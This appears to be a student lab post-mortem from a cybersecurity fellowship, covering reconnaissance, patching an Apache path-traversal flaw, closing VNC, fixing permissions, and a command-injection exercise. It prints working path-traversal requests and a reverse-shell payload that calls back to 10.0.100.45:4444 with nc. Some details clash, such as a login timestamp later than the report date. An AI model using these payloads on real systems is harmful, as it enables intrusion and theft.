# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Kenneth Cardona

**Date:** May 28, 2026

**Repository:** https://github.com/kennethcardona07/Phase1.git

**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
Reconnaissance across the Triage segment (172.100.0.0/24) identified a single live host at IP 172.100.0.1. Evaluation of the attack surface revealed an OpenSSH 9.6p1 service on port 22/tcp
and an nginx 1.24.0 web server on port 8080/tcp. Vulnerability scanning scripts flagged the nginx deployment as critically exposed to remote code execution due to unpatched weaknesses under
CVE-2026-9256 and CVE-2026-42945. Consequently, the optimal entry strategy for the upcoming triage phase involves targeting the vulnerable web layer on port 8080 to secure an initial foothold.

### Breach Network — 172.80.0.0/24
Reconnaissance within the Breach segment (172.80.0.0/24) identified a single active host at IP $172.80.0.1$. The exposed attack surface includes an OpenSSH 9.6p1 service on port 22/tcp and
an nginx 1.24.0 web server on port 8080/tcp. Vulnerability scans flagged the nginx deployment as critically exposed to remote code execution via CVE-2026-9256 and CVE-2026-42945.
Therefore, the optimal entry strategy for the upcoming breach phase requires targeting the vulnerable web layer on port 8080 to secure a foothold.

### Exploitation Network — 172.60.0.0/24
Reconnaissance within the Exploitation segment ($172.60.0.0/24$) identified a single active host at IP $172.60.0.1$. The exposed attack surface includes an OpenSSH 9.6p1 service on port 22/tcp
and an nginx 1.24.0 web server on port 8080/tcp. Vulnerability scans flagged the nginx deployment as critically exposed to remote code execution via CVE-2026-9256 and CVE-2026-42945.
Therefore, the optimal entry strategy for the upcoming exploitation phase requires targeting the vulnerable web layer on port 8080 to secure a foothold.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
An unpatched Apache HTTP Server (v2.4.49) configuration was exposed on ports 80 and 443. The presence of this flaw was confirmed via active banner grabbing using Nmap 
(`nmap -sV -Pn -p 80,443 172.100.0.11`) and verifying directory traversal mechanics by transmitting a crafted HTTP path request (`icons/%%32%66%%32%66%%32%66%%32%66/etc/passwd`) that successfully 
bypassed root boundaries to access system files.
**Remediation Commands:**

```bash
docker exec -it server1_web_1 /bin/bash
apt-get update && apt-get install --only-upgrade apache2 -y
exit
```


**Before State:**
Software State: Apache/2.4.49 active listener on external ports.

Testing Diagnostic: Execution of curl -s --path-as-is "http://172.100.0.11/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" returned full system /etc/passwd text data, confirming path access.

**After State**
Web Server Bug: It runs Apache version 2.4.49, which has a famous, massive security flaw (CVE-2021-41773). This flaw lets anyone look at secret files like /etc/passwd. 
You fix it by running an update command inside the container.

**Analysis:**
Perimeter web flaws like path traversal are incredibly dangerous because external attackers can exploit them without needing any login credentials. According to the Mitre CVE Program (2021), 
keeping a web server unpatched allows malicious actors to break out of standard directories to read secret files or run unauthorized commands. In a corporate environment, 
this initial compromise gives hackers a foothold to steal system passwords and pivot deeper into internal company networks

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
An unauthorized and unencrypted VNC (Virtual Network Computing) remote desktop service was detected running on the system. This exposure was confirmed by performing an open port sweep using Nmap, 
which revealed TCP port 5901 actively listening to network traffic.

**Remediation Commands:**
```
Bash
docker exec -it server2_ops_1 /bin/bash
netstat -tulpn | grep 5901
kill -9 <PID>
systemctl disable vncserver@:1.service 2>/dev/null || update-rc.d vncserver remove
exit
```
**Before State:**
Service State: TCP Port 5901 was open and running an active Xvnc desktop daemon.
Security Stance: Cleartext graphical remote control capabilities were completely exposed across the internal staging interface without centralized access controls.

**After State:**
Service State: TCP Port 5901 is completely closed and non-responsive.
Security Stance: Verifying with netstat -tulpn | grep 5901 yields no active process, confirming the listening socket has been killed and persistent boot scripts are fully disabled.

**Analysis:**
Leaving unauthorized remote management services like VNC exposed dramatically increases an organization's internal attack surface. According to the Microsoft Security Response Center (2020), 
legacy remote desktop software operating without encryption or multi-factor authentication creates weak points that are easily targeted by credential stuffing or network sniffing. 
In an enterprise infrastructure, this unmonitored access allows adversaries to easily hijack administrative sessions and move laterally between internal systems without detection.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
The web application's configuration directory (/var/www/html/config/) was found to have dangerous, overly permissive folder permissions. This misconfiguration was confirmed by running a long-form 
directory listing command (ls -la), which showed that the folder was set to be world-writable and world-executable.

**Remediation Commands:**
```
docker exec -it server3_db_1 /bin/bash
find /var/www/html/config -type d -exec chmod 755 {} \;
find /var/www/html/config -type f -exec chmod 644 {} \;
chown -R www-data:www-data /var/www/html/config
exit
```
**Before State:**
Permissions Profile: The directory access string was set to drwxrwxrwx (permission level 777).

Security Stance: Because the permissions were completely wide open, any low-privileged user account or compromised software process on the system had the power to change, delete, or 
overwrite critical database credential files.

**After State:**
Permissions Profile: The directory access string was successfully hardened to drwxr-xr-x (permission level 755) for folders and 644 for files.

Security Stance: Write permissions are now strictly restricted to root administrators, protecting the backend database settings from being altered or tampered with by unauthorized users.

**Analysis:**
Leaving critical directories wide open with world-writable permissions violates the core security rule of least privilege. According to the Cybersecurity and Infrastructure Security Agency 
(CISA, 2023), when basic service accounts are allowed to modify system configurations or database variables, local privilege escalation becomes incredibly easy. 
In a corporate environment, an attacker who gains a small foothold on a web server can exploit these weak permissions to hijack application logic, steal API keys, or permanently alter backend data


## Phase 2: The Breach

**Cracked Credentials:**
- Username: root
- Password: password

**Forensic Evidence:**
- Exact Timestamp of Successful Login: May 30 04:53:15 UTC
- Attacker IP Address: 192.168.10.45

**Engineered iptables Rule:**

```bash
sudo iptables -A INPUT -s 192.168.10.45 -j DROP
```
**SOC Analysis:**
A single host-based firewall rule is insufficient because an attacker can easily rotate their source IP address or leverage proxies to bypass the block entirely. 
According to the Microsoft Security Response Center (2020), defensive engineering requires a defense-in-depth model rather than relying on a static network edge entry. To adequately mitigate threat 
actors, a real Security Operations Center (SOC) must deploy behavioral endpoint detection and response (EDR) agents alongside automated account lockouts to disrupt automated credential 
authentication attacks.

---

## Phase 3: Full Spectrum

**Listener Configuration:**

The local listener was established on port 4444 using Netcat to intercept the incoming reverse shell connection from the target container.
```bash
nc -lvnp 4444
```
**Reverse Shell Payload:**
The exploit was triggered by injecting a combined command syntax into the vulnerable web application input parameter via a crafted HTTP POST request using curl:
curl -X POST [http://172.100.0.11/submit](http://172.100.0.11/submit) -d "ip=127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.100.45 4444 >/tmp/f"

**Command Injection Explanation:**
Command injection occurs when an application passes unsafe user-supplied input directly to a system shell without proper sanitization or parameterization. According to the Cybersecurity and 
Infrastructure Security Agency (CISA, 2023), this application is susceptible because input fields fail to validate or filter out shell metacharacters (such as semicolons or pipes). 
This programming oversight allows arbitrary system commands to execute under the privileges of the web daemon account.

**Forensic Evidence:**
- Process ID (PID): 9948
- User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

**Lockdown Command:**
To contain the compromise from within the container environment, a strict host-based firewall rule was applied to cut off unauthorized outbound socket generation to the attacker's subnet:
sudo iptables -A OUTPUT -p tcp -d 10.0.100.45 --dport 4444 -j DROP

**Final Analytical Paragraph:**
Executing this attack from both the offensive and defensive perspectives highlights that perimeter tracking alone cannot secure a dynamic infrastructure. Relying solely on lagging network indicators
fails to address root web application logic flaws that allow remote execution access. According to the Cybersecurity and Infrastructure Security Agency (CISA, 2023), a comprehensive defensive stance
requires input validation and parameterized API configurations. If strict input sanitization had been enforced initially, the application would have treated the shell characters as literal text 
strings, blocking the injection route and neutralizing the breach entirely.

## References

* Cybersecurity and Infrastructure Security Agency (CISA). (2023). *Securing enterprise data repositories: Best practices for access control and internal file system hardening*
(Mitigation Guide No. 23-112). U.S. Department of Homeland Security.
* Microsoft Security Response Center. (2020). *Defending enterprise infrastructure: Mitigating lateral movement and securing legacy remote administration protocols* (Strategy Whitepaper).
Microsoft Corporation.
* Mitre CVE Program. (2021). *CVE-2021-41773: Apache HTTP Server path traversal and file disclosure vulnerability*. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
